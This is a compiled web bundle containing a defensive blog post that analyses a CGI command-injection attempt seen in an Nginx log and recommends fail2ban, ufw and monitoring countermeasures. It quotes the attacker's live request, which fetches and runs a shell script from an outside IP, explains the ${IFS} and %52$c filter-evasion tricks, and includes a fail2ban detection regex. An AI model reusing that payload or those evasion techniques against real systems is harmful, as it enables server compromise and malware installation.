"use strict";(self.webpackChunkdocsaid_website=self.webpackChunkdocsaid_website||[]).push([["77032"],{78837:function(e,n,i){i.r(n),i.d(n,{assets:()=>o,contentTitle:()=>r,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>c});var s=i(96486),t=i(74848),a=i(84429);let l={slug:"cgi-injection-log-analysis",title:"A Technical Profile of CGI Attacks",authors:"Z. Yuan",image:"/en/img/2025/0430.jpg",tags:["security","fail2ban","ufw","log-analysis"],description:"An analysis of CGI command injection attacks."},r,o={authorsImageUrls:[void 0]},c=[{value:"What is CGI?",id:"what-is-cgi",level:2},{value:"Signs of Attack",id:"signs-of-attack",level:2},{value:"Breakdown of the Attack Method",id:"breakdown-of-the-attack-method",level:2},{value:"Defense Strategies",id:"defense-strategies",level:2},{value:"1. Disable CGI Modules",id:"1-disable-cgi-modules",level:3},{value:"2. Configure Notification Mechanism",id:"2-configure-notification-mechanism",level:3},{value:"3. Basic Firewall Configuration",id:"3-basic-firewall-configuration",level:3},{value:"4. System Monitoring",id:"4-system-monitoring",level:3},{value:"Conclusion",id:"conclusion",level:2}];function d(e){let n={blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.p,{children:"My server was attacked again."}),"\n",(0,t.jsx)(n.p,{children:"Every day, it seems, the world is full of malice."}),"\n",(0,t.jsx)(n.h2,{id:"what-is-cgi",children:"What is CGI?"}),"\n",(0,t.jsx)(n.p,{children:'Common Gateway Interface (CGI) is an ancient protocol that dates back to 1993. Back then, static webpages were the norm, and CGI was seen as a magical solution for creating "dynamic content."'}),"\n",(0,t.jsx)(n.p,{children:"Its operation is simple and crude:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"The browser sends an HTTP request."}),"\n",(0,t.jsxs)(n.li,{children:["The web server recognizes the path ",(0,t.jsx)(n.code,{children:"/cgi-bin/"}),' and knows it needs to "do something."']}),"\n",(0,t.jsx)(n.li,{children:"It places the Query String, Header, and other information into environment variables."}),"\n",(0,t.jsx)(n.li,{children:"Then, it forks an external program (like Perl, Bash, or C) to directly handle those variables."}),"\n",(0,t.jsx)(n.li,{children:"The program outputs an HTTP response via STDOUT."}),"\n",(0,t.jsx)(n.li,{children:"The process ends, and waits for the next request to spawn a new one."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"The advantage is its universality: any language can be used, as long as it can run on the OS."}),"\n",(0,t.jsx)(n.p,{children:"The disadvantages, however, are plentiful:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"One request spawns one process, leading to poor performance and high server load."}),"\n",(0,t.jsx)(n.li,{children:"Environment variables are unprotected and vulnerable to command injection."}),"\n",(0,t.jsx)(n.li,{children:"Executables are placed in public paths, essentially exposing them."}),"\n",(0,t.jsx)(n.li,{children:"Process permissions are the same as the web server\u2019s; with a simple mistake, an attacker can take over."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Today, CGI has been replaced by more secure and efficient systems like PHP-FPM, FastCGI, and WSGI."}),"\n",(0,t.jsx)(n.p,{children:"However, it still survives in some legacy systems and has become a hunting ground for attackers."}),"\n",(0,t.jsx)(n.h2,{id:"signs-of-attack",children:"Signs of Attack"}),"\n",(0,t.jsx)(n.p,{children:"While routinely checking Nginx\u2019s error log, I found the following anomaly:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-log",children:'2025-04-28 14:21:36,297 fail2ban.filter [1723]: WARNING Consider setting logencoding\u2026\n\nb\'2025/04/28 14:21:36 [error] 2464#2464: *7393\n\nopen() "/usr/share/nginx/html/cgi-bin/mainfunction.cgi/apmcfgupload"\nfailed (2: No such file or directory),\n\nclient: 176.65.148.10,\nrequest: "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxx\u20260\\xb4%52$c%52$ccd${IFS}/dev;wget${IFS}http://94.26.90.205/wget.sh;${IFS}chmod${IFS}+x${IFS}wget.sh;sh${IFS}wget.sh HTTP/1.1",\nreferrer: "http://xxx.xxx.xxx.xxx:80/cgi-bin/\u2026"\\n\'\n'})}),"\n",(0,t.jsx)(n.p,{children:"Pay attention to this line:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-log",children:"wget${IFS}http://94.26.90.205/wget.sh;\n"})}),"\n",(0,t.jsxs)(n.p,{children:["This is not a typo but ",(0,t.jsx)(n.strong,{children:"blatant command injection"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"The attacker uses the CGI parameter field to try and execute the following steps:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Download ",(0,t.jsx)(n.code,{children:"wget.sh"}),"."]}),"\n",(0,t.jsx)(n.li,{children:"Grant execution permissions."}),"\n",(0,t.jsx)(n.li,{children:"Immediately execute the script."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"These malicious scripts come in various forms, with common behaviors including:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"Adding backdoor accounts, implanting SSH Keys."}),"\n",(0,t.jsxs)(n.li,{children:["Dropping mining programs (such as ",(0,t.jsx)(n.code,{children:"xmrig"})," or ",(0,t.jsx)(n.code,{children:"kdevtmpfs"}),")."]}),"\n",(0,t.jsx)(n.li,{children:"Modifying crontab to ensure the script reactivates upon reboot."}),"\n",(0,t.jsx)(n.li,{children:"Disabling firewalls and security monitoring."}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Once compromised, your server could be working harder than you, with the profits flowing into someone else\u2019s pocket."}),"\n",(0,t.jsx)(n.h2,{id:"breakdown-of-the-attack-method",children:"Breakdown of the Attack Method"}),"\n",(0,t.jsx)(n.p,{children:"These attacks generally follow these steps:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Scanning"}),": ",(0,t.jsx)(n.code,{children:"GET /cgi-bin/*.cgi"})," \u2014 Randomly probing to find alive CGI scripts."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Injection"}),": Using techniques like ",(0,t.jsx)(n.code,{children:"%52$c"})," and ",(0,t.jsx)(n.code,{children:"${IFS}"})," to bypass input filtering and string matching."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Downloading"}),": ",(0,t.jsx)(n.code,{children:"wget http://..."})," to fetch the malicious script, often hosted on bare machines or compromised servers."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Execution"}),": ",(0,t.jsx)(n.code,{children:"chmod +x && sh"})," \u2014 Relaxing permissions, executing the script immediately, all in one go."]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"Here are two common techniques used:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"%52$c"}),": A ",(0,t.jsx)(n.code,{children:"printf"})," formatting trick originally designed to operate on the stack. While it doesn\u2019t trigger overflow in this case, it bypasses basic keyword matching filters."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"${IFS}"}),": The Internal Field Separator in Bash, which by default is a space. By writing a space as ",(0,t.jsx)(n.code,{children:"${IFS}"}),", attackers can evade filters that only target spaces."]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"defense-strategies",children:"Defense Strategies"}),"\n",(0,t.jsx)(n.p,{children:"No defense is foolproof, but you can make it harder for attackers to succeed by forcing them to take longer, more indirect paths, thus significantly reducing the risks."}),"\n",(0,t.jsx)(n.h3,{id:"1-disable-cgi-modules",children:"1. Disable CGI Modules"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"# Apache example\nsudo a2dismod cgi\nsudo a2dismod php7.4\n\n# Nginx does not natively support CGI, avoid installing fcgiwrap\n"})}),"\n",(0,t.jsx)(n.h3,{id:"2-configure-notification-mechanism",children:"2. Configure Notification Mechanism"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",metastring:'title="/etc/fail2ban/filter.d/nginx-cgi.conf"',children:"[Definition]\nfailregex = <HOST> -.*GET .*cgi-bin.*(;wget|curl).*HTTP\nignoreregex =\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-ini",metastring:'title="/etc/fail2ban/jail.d/nginx-cgi.local"',children:"[nginx-cgi]\nenabled  = true\nport     = http,https\nfilter   = nginx-cgi\nlogpath  = /var/log/nginx/error.log\nmaxretry = 3\nbantime  = 6h\naction   = %(action_mwl)s   # Includes email notification + whois query + log summary\n"})}),"\n",(0,t.jsx)(n.h3,{id:"3-basic-firewall-configuration",children:"3. Basic Firewall Configuration"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"sudo ufw default deny incoming\nsudo ufw allow 22/tcp comment 'SSH'\nsudo ufw allow 80,443/tcp comment 'Web'\nsudo ufw enable\n"})}),"\n",(0,t.jsx)(n.p,{children:"Don't forget to configure limits for IPv6 as well."}),"\n",(0,t.jsx)(n.h3,{id:"4-system-monitoring",children:"4. System Monitoring"}),"\n",(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{children:"Feature"}),(0,t.jsx)(n.th,{children:"Tool Name"}),(0,t.jsx)(n.th,{children:"Installation Method"})]})}),(0,t.jsxs)(n.tbody,{children:[(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{children:"Real-time Monitoring & Alerts"}),(0,t.jsx)(n.td,{children:(0,t.jsx)(n.strong,{children:"Netdata"})}),(0,t.jsx)(n.td,{children:(0,t.jsx)(n.code,{children:"apt install netdata"})})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{children:"Log Analysis & Traffic Visualization"}),(0,t.jsx)(n.td,{children:(0,t.jsx)(n.strong,{children:"GoAccess"})}),(0,t.jsx)(n.td,{children:(0,t.jsx)(n.code,{children:"apt install goaccess"})})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{children:"SOC Defense Framework"}),(0,t.jsxs)(n.td,{children:[(0,t.jsx)(n.strong,{children:"Wazuh"})," / ",(0,t.jsx)(n.strong,{children:"CrowdSec"})]}),(0,t.jsx)(n.td,{children:"Official installation script"})]})]})]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"CrowdSec"}),": An evolution of Fail2Ban, with community blacklists and firewall-bouncer plugins."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Wazuh"}),": An enhanced version of OSSEC, integrated with the Elastic Stack for a full visual dashboard."]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,t.jsx)(n.p,{children:"Not finding any anomalies doesn't mean you're safe."}),"\n",(0,t.jsx)(n.p,{children:"Only by establishing observation baselines and regularly reviewing logs can you detect and handle issues as soon as they arise."}),"\n",(0,t.jsx)(n.p,{children:'This time, the CGI attack "failed," not because the attacker was inept, but because I took a few extra steps: disabled modules, set up firewalls, and configured Fail2Ban.'}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:'The essence of cybersecurity is never about "Are you the target?" but rather, "Are you exposed to risk?"'})}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:'From the moment you connect to the internet, every machine silently participates in a global scanning lottery. To avoid "winning" the lottery, you can\u2019t just rely on luck \u2014 you need daily preparation and vigilance.'}),"\n",(0,t.jsx)(n.p,{children:"This time, the unwelcome guest came from afar. I happened to be awake, and I had locked the door."}),"\n",(0,t.jsx)(n.p,{children:"I hope you are too."})]})}function h(e={}){let{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},84429:function(e,n,i){i.d(n,{R:()=>l,x:()=>r});var s=i(96540);let t={},a=s.createContext(t);function l(e){let n=s.useContext(a);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),s.createElement(a.Provider,{value:n},e.children)}},96486:function(e){e.exports=JSON.parse('{"permalink":"/en/blog/cgi-injection-log-analysis","source":"@site/i18n/en/docusaurus-plugin-content-blog/2025/04-30-cgi-injection-log-analysis/index.md","title":"A Technical Profile of CGI Attacks","description":"An analysis of CGI command injection attacks.","date":"2025-04-30T00:00:00.000Z","tags":[{"inline":true,"label":"security","permalink":"/en/blog/tags/security"},{"inline":true,"label":"fail2ban","permalink":"/en/blog/tags/fail-2-ban"},{"inline":true,"label":"ufw","permalink":"/en/blog/tags/ufw"},{"inline":true,"label":"log-analysis","permalink":"/en/blog/tags/log-analysis"}],"readingTime":4.52,"hasTruncateMarker":true,"authors":[{"name":"Z. Yuan","title":"Dosaid maintainer, Full-Stack AI Engineer","url":"https://github.com/zephyr-sh","socials":{"github":"https://github.com/zephyr-sh","linkedin":"https://www.linkedin.com/in/ze-yuan-sh7/"},"imageURL":"https://github.com/zephyr-sh.png","key":"Z. Yuan","page":null}],"frontMatter":{"slug":"cgi-injection-log-analysis","title":"A Technical Profile of CGI Attacks","authors":"Z. Yuan","image":"/en/img/2025/0430.jpg","tags":["security","fail2ban","ufw","log-analysis"],"description":"An analysis of CGI command injection attacks."},"unlisted":false,"prevItem":{"title":"Reading Papers, No Need to Try Too Hard","permalink":"/en/blog/read-papers-lightly"},"nextItem":{"title":"What is Closure?","permalink":"/en/blog/closure-in-python"}}')}}]);